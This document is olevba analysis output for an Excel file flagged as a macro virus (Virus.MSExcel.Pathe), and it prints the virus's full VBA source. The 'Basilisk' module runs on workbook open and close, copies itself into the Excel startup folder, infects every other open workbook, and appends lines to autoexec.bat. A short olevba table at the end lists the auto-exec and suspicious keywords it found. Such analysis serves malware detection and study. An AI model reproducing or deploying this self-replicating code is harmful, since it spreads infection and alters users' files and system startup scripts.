olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Pathe-3ee83adfc181e612ad53cf2556380b702fb8bfe1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Pathe-3ee83adfc181e612ad53cf2556380b702fb8bfe1 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Pathe-3ee83adfc181e612ad53cf2556380b702fb8bfe1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Pathe-3ee83adfc181e612ad53cf2556380b702fb8bfe1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Pathe-3ee83adfc181e612ad53cf2556380b702fb8bfe1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Pathe-3ee83adfc181e612ad53cf2556380b702fb8bfe1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Pathe-3ee83adfc181e612ad53cf2556380b702fb8bfe1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Pathe-3ee83adfc181e612ad53cf2556380b702fb8bfe1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Basilisk.bas 
in file: Virus.MSExcel.Pathe-3ee83adfc181e612ad53cf2556380b702fb8bfe1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Basilisk'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub auto_open()
On Error Resume Next
With Application
.EnableCancelKey = 0
.ScreenUpdating = False
End With
Dim Beak, Salmon, Camel As Integer
Dim BasiliskExists As Boolean
Const Draco = "C:\Draco"
For Beak = 1 To ActiveWorkbook.VBProject.VBComponents.count
    If ActiveWorkbook.VBProject.VBComponents.Item(Beak).Name = "Basilisk" Then
        Camel = Beak
    End If
Next Beak
ActiveWorkbook.VBProject.VBComponents.Item(Camel).Export Draco
If Dir("c:\program files\microsoft office\office\xlstart\book1.xls") = "" Then
    Workbooks.Add
    ActiveWorkbook.VBProject.VBComponents.Import Draco
    ActiveWorkbook.SaveAs "c:\program files\microsoft office\office\xlstart\book1.xls"
    ActiveWorkbook.Close
End If
For Beak = 1 To Excel.Windows.count
    For Salmon = 1 To Application.Workbooks.Item(Beak).VBProject.VBComponents.count
        If Application.Workbooks.Item(Beak).VBProject.VBComponents.Item(Salmon).Name = "Basilisk" Then
            BasiliskExists = True
            GoTo BasiliskFound
        Else
            BasiliskExists = False
        End If
    Next Salmon
BasiliskFound:
    If BasiliskExists <> True Then
           Application.Workbooks.Item(Beak).VBProject.VBComponents.Import Draco
           Application.Workbooks.Item(Beak).Save
           Open "c:\autoexec.bat" For Append As #1
           Print #1, "@echo T'as été mordu par... Le bec du Saumon " & Application.UserName
           'print #1, "@copy c:\windows\*.ini super.ini /Y"
           Close #1
    End If
Next Beak
Application.ScreenUpdating = True
If Month(Now) = 5 Then
    ActiveWorkbook.Close    'Pathetique je sais
End If
End Sub
Private Sub auto_close()
auto_open
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

